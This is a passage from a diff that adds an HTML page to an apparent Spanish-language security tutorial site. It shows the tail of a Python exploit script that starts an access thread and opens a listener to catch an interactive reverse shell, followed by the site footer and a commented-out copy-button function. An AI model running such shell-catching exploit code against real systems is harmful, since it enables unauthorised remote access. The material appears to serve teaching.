+                if __name__ == '__main__':<br>
+                <br>
+                createFile()<br>
+                try:<br>
+                threading.Thread(target=getAccess, args=()).start()<br>
+                except Exception as e:<br>
+                log.error(str(e))<br>
+                <br>
+                shell = listen(lport, timeout=20).wait_for_connection()<br>
+                shell.interactive()<br>
+                getAccess()<br>
+            </div>
+        </div>
+        <!-- Other content items go here -->
+    </section>
+
+    <footer>
+        <p>© 2024 SecuritiXplore - Todos los derechos reservados</p>
+    </footer>
+
+    <script src="js/securitixplore.js"></script>
+    <!--
+    <script>
+        function copyCommand() {
+            // Selecciona el contenido del elemento con la clase "command"
+            const commandText = document.querySelector('.command').innerText;
+
+            // Crea un elemento temporal (textarea) para copiar el texto
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = commandText;
+
+            // Añade el elemento temporal al DOM
+            document.body.appendChild(tempTextArea);
+
+            // Selecciona y copia el texto
+            tempTextArea.select();
+            document.execCommand('copy');
+
+            // Elimina el elemento temporal
+            document.body.removeChild(tempTextArea);
+
+            // Cambia el texto del botón a "Copiado!"
+            document.getElementById('copyButton').innerText = 'Copiado!';
+
+            // Después de 1.5 segundos, restaura el texto del botón a "Copiar"
+            setTimeout(function () {
+                document.getElementById('copyButton').innerText = 'Copiar';
+            }, 1500);
+        }
+    </script>
+-->
+</body>
+
+</html>
